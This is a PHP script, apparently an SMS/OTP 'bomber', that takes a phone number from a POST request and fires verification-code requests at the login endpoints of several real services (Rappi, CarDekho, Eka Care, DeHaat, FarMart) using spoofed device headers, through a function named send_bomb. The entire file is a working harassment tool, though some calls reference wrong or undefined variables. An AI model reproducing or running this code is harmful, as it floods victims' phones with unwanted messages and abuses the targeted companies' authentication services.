<?php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Allow-Headers: *");
header("Content-Type: application/json");
    $number = $_POST['number'];
echo $number;
# CURL

function send_bomb($url, $data, $headers)
{
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $output = curl_exec($ch);
    curl_close($ch);
    $json = json_decode($output, true);
}

# URL DATA HEADERS

$url1 = 'https://services.rappi.com/api/rappi-authentication/login/whatsapp/create';

$data1 = '{"phone":"' . $number . '","country_code":"+91","code":"","template":"account_verification_link"}';

$headers1 = ['Host: services.rappi.com', 'Deviceid: 5df83c463f0ff8ff', 'User-Agent: Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/QP1A.190711.020)', 'Accept-Language: en-US', 'Accept: application/json', 'Content-Type: application/json; charset=UTF-8', 'Accept-Encoding: gzip, deflate'];

send_bomb($url1, $data1, $headers1);

#############################################################################

$url2 = 'https://apis.cardekho.com/f8';

$data2 = '{"operationName":"SendOtp","variables":{"payload":{"mobile":"' . $number . '","connectoid":"1a118b8e-b667-1cd1-3f5e-3eee6f8da77f","waOtp":false,"platform":"web","utmParams":{}}},"query":"mutation SendOtp($payload: UserInput!) {\n  sendOtp(payload: $payload) {\n    token\n    name\n    existingUser\n    whatsappOptIn\n    __typename\n  }\n}\n"}';

$headers2 = ['Host: apis.cardekho.com', 'Accept: */*', 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.102 Safari/537.36', 'Content-Type: application/json', 'Origin: https://www.bikedekho.com', 'Referer: https://www.bikedekho.com/', 'Accept-Encoding: gzip, deflate', 'Accept-Language: en-US,en;q=0.9'];

send_bomb($url2, $data2, $headers3);

#############################################################################

$url3 = 'https://auth.eka.care/auth/init';

$data3 = '{"payload":{"allowWhatsapp":true,"mobile":"+91' . $number . '"},"type":"mobile"}';

$headers3 = ['Host: auth.eka.care', 'Device-Id: 5df83c463f0ff8ff', 'Flavour: android', 'Locale: en', 'Version: 1382', 'Client-Id: androidp', 'Content-Type: application/json; charset=UTF-8', 'Accept-Encoding: gzip, deflate', 'User-Agent: okhttp/4.9.3'];

send_bomb($url3, $data3, $headers3);

#############################################################################

$url4 = 'https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP?app_code=dehaat_business&lang=en';

$data4 = '{"mobile_number":"' . $number . '","client_id":"businessapp"}';

$headers4 = ['Host: oidc.agrevolution.in', 'Content-Type: application/json; charset=UTF-8', 'Accept-Encoding: gzip, deflate', 'User-Agent: okhttp/4.9.1'];

send_bomb($url4, $data4, $headers4);

#############################################################################

$url15 = 'https://prod.farmart.farm/v1/auth/initiate_otp';

$data15 = '{"mobile_number":"' . $number . '","message_id":["u6o+RJnCqoX"],"country_code":91}';

$headers15 = ['Host: prod.farmart.farm', 'Accept: application/json', 'Content-Type: application/json', 'Accept-Encoding: gzip, deflate', 'User-Agent: okhttp/4.9.1'];

send_bomb($url5, $data5, $headers5);

############# CALL THE FUNCTION #############

?>